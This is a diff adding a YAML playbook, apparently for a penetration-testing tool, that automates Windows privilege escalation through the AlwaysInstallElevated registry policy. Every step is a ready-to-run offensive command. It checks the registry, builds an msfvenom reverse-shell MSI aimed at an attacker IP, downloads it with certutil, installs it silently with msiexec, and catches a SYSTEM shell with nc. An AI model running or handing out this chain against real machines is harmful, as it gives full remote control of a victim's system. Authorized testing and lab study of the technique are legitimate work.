@@ -1,0 +1,49 @@
+id: alwaysinstallelevated
+name: "Windows PE — AlwaysInstallElevated → MSI to SYSTEM"
+description: >
+  When both HKLM\\...\\Installer\\AlwaysInstallElevated and the matching
+  HKCU key are 1, any user can install MSI packages elevated. msfvenom
+  builds the payload in seconds.
+tags: [windows, priv-esc, msi, classic-windows]
+difficulty: easy
+
+inputs: []
+
+steps:
+  - id: check_registry
+    name: "Confirm AlwaysInstallElevated = 1 in HKLM + HKCU"
+    inline_command: |
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    notes: |
+      BOTH must return `REG_DWORD 0x1`. If only one is set, this won't work.
+
+  - id: craft_msi
+    name: "Craft the MSI payload (attacker box)"
+    inline_command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o /tmp/install.msi"
+    inputs:
+      lhost: "${attacker_ip}"
+      lport: "4444"
+
+  - id: transfer
+    name: "Transfer to target (any method)"
+    inline_command: "# attacker: python3 -m http.server 80\n# victim: certutil -urlcache -f http://<lhost>/install.msi C:\\Windows\\Temp\\install.msi"
+    inputs:
+      lhost: "${attacker_ip}"
+
+  - id: install
+    name: "Trigger msiexec /quiet"
+    inline_command: "msiexec /quiet /qn /i C:\\Windows\\Temp\\install.msi"
+    notes: |
+      `/quiet /qn` suppresses UI. No need for elevation prompts thanks to
+      the policy. Reverse shell comes back as SYSTEM.
+
+  - id: confirm
+    name: "Catch the reverse shell"
+    inline_command: "nc -lvnp <lport>; # then `whoami` → nt authority\\system"
+    inputs:
+      lport: "4444"
+
+references:
+  - title: "HackTricks — AlwaysInstallElevated"
+    url:   "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated"
